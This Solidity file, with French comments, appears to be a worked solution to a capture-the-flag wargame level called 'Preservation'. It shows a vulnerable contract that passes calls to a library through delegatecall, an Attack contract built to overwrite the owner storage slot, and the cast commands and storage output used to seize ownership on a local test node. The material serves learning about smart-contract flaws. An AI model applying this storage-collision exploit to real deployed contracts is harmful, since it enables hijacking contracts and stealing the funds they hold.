// Ce contrat utilise une bibliothèque pour stocker deux heures différentes pour deux fuseaux horaires différents. Le constructeur crée deux instances de la bibliothèque pour chaque heure à stocker.

// L'objectif de ce niveau est de revendiquer la propriété de l'instance qui vous est donnée.

//   Des choses qui pourraient aider

// Consultez la documentation de Solidity sur la delegatecallfonction de bas niveau, son fonctionnement, la manière dont elle peut être utilisée pour déléguer des opérations aux bibliothèques en chaîne et ses implications sur la portée de l'exécution.
// Comprendre ce que signifie delegatecallpréserver le contexte.
// Comprendre comment les variables de stockage sont stockées et accessibles.
// Comprendre comment fonctionne le casting entre différents types de données.
// SPDX-License-Identifier: MIT

//HACK
/* Pour hacker le contract j'ecris un contract Attack dont le slot 2 correspond 
   au slot 2 du contract Preservation a savoir owner
   J'appelle d'abord la fonction setFirstTime avec l'adresse du contract Attack deployé que
   j'ai convertie en uint256 en faisant uint256(uint160(attack_contract_adress)) avecc chisel
   et j'effectue cette commande cast send $p "setFirstTime(uint256)"
    1184589422945421143511828701991100965039074119625 --rpc-url 127.0.0.1:8545 --account anvil
  ou 1184589422945421143511828701991100965039074119625 correpond a l'adresse du contract Attack deployé
  a savoir 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 convertie en uint256.
  En ce moment avec cette commande cast storage $p 0
  output : 0x000000000000000000000000cf7ed3acca5a467e9e704c703e8d87f634fb0fc9
  je vois que l'adresse au slot 0 est devenue l'adresse de mon contract Attack
  Je convertie une adresse cette fois-ci 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 qui sera
  celle du nouveau owner en uint256 et j'effectue 
  cast send $p "setFirstTime(uint256)" 
  642829559307850963015472508762062935916233390536 --rpc-url 127.0.0.1:8545 --account anvil
  ou 642829559307850963015472508762062935916233390536 correspond a 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  sur 256 bits sous forme decimale.
  Maintenant je peux voir que l'adresse du owner est devenue 
  cast storage $p 2
output: 0x00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
Avant l'adresse du owner etait 
cast storage $p 2
 output: 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266 qui correspond
  au compte anvil créé avec cast wallet import anvil --interactive 

   */
pragma solidity ^0.8.0;
import {console} from "forge-std/console.sol";

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    //En appelant cette fonction avec une adresse  convertie en uint256
    //correspondant a une instance du contract Attack
    //l'adresse de timeZone1Library sera changée par celle
    //de cette instance.
    //J'appelle la fonction une deuxième fois avec l'adresse convertie en uint256
    //du nouveau owner que je veux et comme
    //le slot 2 dans le contract Attack correspond au slot 2
    //dans ce contract l'adresse du owner sera alors modifiée
    //par celle du nouveau owner;
    function setFirstTime(uint256 _timeStamp) public {
        (bool result, ) = timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
        console.log("result is ", result);
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        (bool result, ) = timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
        console.log("result is ", result);
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract Attack {
    address one;
    address two;
    address owner; // corespondant au slot du owner dans le contract Preservation

    function setTime(uint256 _time) public {
        owner = address(uint160(uint256(_time)));
    }
}
